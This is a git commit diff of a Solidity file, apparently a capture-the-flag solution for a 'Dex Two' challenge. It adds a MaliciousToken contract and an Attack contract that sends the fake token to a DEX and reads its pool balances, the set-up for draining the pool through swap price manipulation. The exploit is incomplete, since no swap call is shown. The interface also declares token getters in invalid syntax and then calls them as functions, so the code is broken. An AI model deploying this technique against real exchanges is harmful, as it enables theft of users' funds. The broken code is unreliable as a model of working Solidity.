77b1b51834406d13786a1260262ea0e58e2f4427
Helkomine <da24rhma@gmail.com>
2026-03-02 21:38:54 +0700

    Update Dex2Solution.sol

--- Dex2Solution.sol
+++ Dex2Solution.sol
@@ -1,10 +1,31 @@
 // SPDX-License-Identifier: CC0-1.0
 pragma solidity ^0.8.20;
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+
 interface Dex2 {
     function swap(address from, address to, uint256 amount) external;
+    address external view token1;
+    address external view token2;
 }
+
+contract MaliciousToken is ERC20 {
+    constructor(uint256 initialSupply) ERC20("MaliciousToken", "MT") {
+        _mint(msg.sender, initialSupply);
+    }
+}
+
 contract Attack {
     Dex2 public dex2;
 
-    constructo 
+    constructor(Dex2 _dex2) {       
+        dex2 = _dex2;
+    }
+
+    function attack() public {
+        // Tổng số token chính xác sẽ được dùng
+        IERC20 maliciousToken = IERC20(new MaliciousToken(4));
+        maliciousToken.transfer(address(dex2), 1);
+        IERC20(dex2.token1()).balanceOf(address(dex2));
+        IERC20(dex2.token2()).balanceOf(address(dex2));
+    }
 }
